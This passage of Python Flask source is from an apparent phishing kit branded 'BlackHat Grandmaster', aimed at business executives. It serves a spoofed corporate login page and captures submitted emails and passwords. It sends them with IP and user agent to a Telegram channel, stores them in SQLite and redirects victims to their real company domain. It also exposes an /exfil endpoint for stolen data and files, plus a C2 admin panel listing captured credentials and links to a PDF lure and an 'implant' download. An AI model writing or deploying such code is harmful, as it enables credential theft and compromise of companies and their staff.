    <div class="login-header">
        <h1>{template['logo']} {template['name']}</h1>
        <p>Secure Authentication Required</p>
    </div>
    <div class="login-body">
        <form method="POST" action="/login/submit/{ref_id}">
            <div class="form-group">
                <label>Corporate Email</label>
                <input type="email" name="email" placeholder="first.last@company.com" required autofocus>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your credentials" required>
            </div>
            <button type="submit">Sign In</button>
        </form>
        <div class="mfa-note">
            <i class="fas fa-shield-alt"></i> Multi-factor authentication will be required after initial verification
        </div>
        <div class="secure-badge">
            🔒 SSL/TLS Encrypted • SOC 2 Type II • GDPR Compliant
        </div>
    </div>
</div>
</body>
</html>'''

@app.route('/login/submit/<ref_id>', methods=['POST'])
def login_submit(ref_id):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')
    
    # Extract domain for business targeting
    domain = email.split('@')[-1] if '@' in email else 'unknown'
    
    tg_send(f"""🏢 <b>BUSINESS COMPROMISE - CREDENTIALS CAPTURED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 <b>Email:</b> {email}
🔑 <b>Password:</b> {password}
🏛️ <b>Domain:</b> {domain}
🌐 <b>IP:</b> {ip}
🖥️ <b>User-Agent:</b> {ua[:80]}
🔖 <b>Reference:</b> {ref_id}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💀 <b>STATUS:</b> COMPROMISED""")
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO credentials (victim_id, source, url, username, password, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
              (ref_id, "business_portal", f"Domain: {domain}", email, password, datetime.now().isoformat()))
    c.execute("INSERT INTO business_data (victim_id, data_type, data_content, timestamp) VALUES (?, ?, ?, ?)",
              (ref_id, "corporate_credentials", f"{email}:{password}", datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    # Redirect to real company portal based on domain
    redirect_url = f"https://{domain}" if domain != 'unknown' else "https://www.microsoft.com"
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta http-equiv="refresh" content="2;url={redirect_url}">
        <style>
            body {{ text-align: center; padding: 50px; font-family: 'Inter', sans-serif; background: #f5f7fa; }}
            .success {{ background: #c6f6d5; color: #22543d; padding: 20px; border-radius: 12px; display: inline-block; }}
        </style>
    </head>
    <body>
        <div class="success">
            <h2>✓ Verification Complete</h2>
            <p>Redirecting to secure corporate portal...</p>
        </div>
    </body>
    </html>
    '''

@app.route('/track/<ref_id>', methods=['POST'])
def track(ref_id):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    tg_send(f"👁️ PAGE VIEW TRACKED\nRef: {ref_id}\nIP: {ip}")
    return "OK"

@app.route('/exfil', methods=['POST'])
def exfil():
    victim_id = request.form.get('victim_id') or (request.json.get('victim_id') if request.is_json else None)
    data_type = request.form.get('type') or (request.json.get('type') if request.is_json else None)
    data = request.form.get('data') or (request.json.get('data') if request.is_json else None)
    
    if 'file' in request.files:
        file = request.files['file']
        data = f"[FILE: {file.filename}]"
    
    if victim_id and data:
        tg_send(f"📡 BUSINESS EXFIL from {victim_id}\n📊 {data_type}: {str(data)[:500]}")
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO business_data (victim_id, data_type, data_content, timestamp) VALUES (?, ?, ?, ?)",
                  (victim_id, data_type or "unknown", str(data)[:1000], datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    return "OK"

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST' and request.form.get('password') == ADMIN_PASSWORD:
        session['admin'] = True
    if not session.get('admin'):
        return '''
        <!DOCTYPE html>
        <html>
        <head><title>BlackHat Admin</title>
        <style>body{background:#0a0c10;display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Courier New',monospace}
        .card{background:#1a1e24;padding:40px;border-radius:16px;width:320px;border:1px solid #00ff88}
        h2{color:#00ff88;margin-bottom:20px}
        input{width:100%;padding:12px;margin:10px 0;background:#0a0c10;border:1px solid #00ff88;border-radius:8px;color:#00ff88}
        button{width:100%;padding:12px;background:#00ff88;color:#0a0c10;border:none;border-radius:8px;font-weight:bold}</style>
        </head>
        <body><div class="card"><h2>🔐 BLACKHAT ADMIN</h2>
        <form method="POST"><input type="password" name="password" placeholder="Access Code" required>
        <button type="submit">ENTER</button></form></div></body></html>
        '''
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    creds = c.execute("SELECT * FROM credentials ORDER BY timestamp DESC LIMIT 50").fetchall()
    biz_data = c.execute("SELECT * FROM business_data ORDER BY timestamp DESC LIMIT 30").fetchall()
    conn.close()
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>🐉 BLACKHAT GRANDMASTER C2</title>
        <style>
            *{{margin:0;padding:0;box-sizing:border-box}}
            body{{background:#0a0c10;font-family:'Courier New',monospace;padding:20px}}
            .container{{max-width:1400px;margin:0 auto}}
            .header{{background:linear-gradient(135deg,#1a1e24,#0a0c10);padding:20px;border-radius:12px;margin-bottom:20px;border-left:4px solid #ff0040}}
            .header h1{{color:#ff0040}}
            .stats{{display:grid;grid-template-columns:repeat(3,1fr);gap:15px;margin-bottom:20px}}
            .stat{{background:#1a1e24;padding:20px;border-radius:12px;text-align:center;border:1px solid #ff004020}}
            .stat-num{{font-size:36px;font-weight:bold;color:#ff0040}}
            .stat-label{{color:#6c7293;margin-top:8px}}
            .section{{background:#1a1e24;border-radius:12px;padding:20px;margin-bottom:20px}}
            .section-title{{color:#ff0040;font-size:18px;margin-bottom:15px;border-bottom:1px solid #ff0040;padding-bottom:10px}}
            table{{width:100%;border-collapse:collapse}}
            th,td{{text-align:left;padding:10px;border-bottom:1px solid #2a2e3a;color:#e2e8f0}}
            th{{color:#ff0040}}
            .badge{{color:#00ff88}}
        </style>
    </head>
    <body>
    <div class="container">
        <div class="header">
            <h1>🐉 BLACKHAT GRANDMASTER v2026</h1>
            <p style="color:#6c7293">BUSINESS COMPROMISE PLATFORM | C-Suite Targeting | Active</p>
        </div>
        <div class="stats">
            <div class="stat"><div class="stat-num">{len(creds)}</div><div class="stat-label">Credentials</div></div>
            <div class="stat"><div class="stat-num">{len(biz_data)}</div><div class="stat-label">Exfil Data</div></div>
            <div class="stat"><div class="stat-num">ACTIVE</div><div class="stat-label">Status</div></div>
        </div>
        <div class="section">
            <div class="section-title">🔐 CAPTURED CREDENTIALS</div>
            <table>
                <tr><th>ID</th><th>Source</th><th>Email/Username</th><th>Password</th><th>Time</th></tr>
                {''.join(f'<tr><td>{c[1][:12] if c[1] else "N/A"}</td><td>{c[2]}</td><td>{c[4][:40]}</td><td style="color:#00ff88">{c[5][:40]}</td><td>{c[6][:16]}</td></tr>' for c in creds[:20]) if creds else '<tr><td colspan="5">No credentials captured</td></tr>'}
            </table>
        </div>
        <div class="section">
            <div class="section-title">📡 DEPLOYMENT LINKS</div>
            <p style="color:#e2e8f0">🌐 MAIN PORTAL: <span style="color:#00ff88">{request.host_url}</span></p>
            <p style="color:#e2e8f0">📄 PDF LINK: <span style="color:#00ff88">{request.host_url}pdf</span></p>
            <p style="color:#e2e8f0">📥 IMPLANT: <span style="color:#00ff88">{request.host_url}download</span></p>
            <p style="color:#6c7293; margin-top:15px">🔹 Intelligent template selection based on target profile</p>
            <p style="color:#6c7293">🔹 25+ business sectors supported</p>
        </div>
    </div>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    return jsonify({"status": "operational", "version": "BlackHat Grandmaster 2026", "timestamp": datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    tg_send(f"🐉 BLACKHAT GRANDMASTER v2026 DEPLOYED\n🌐 {request.host if hasattr(request, 'host') else 'localhost'}\n💀 STATUS: ACTIVE\n🎯 TARGETING: C-Suite & Business Executives")
    app.run(host='0.0.0.0', port=port, threaded=True)
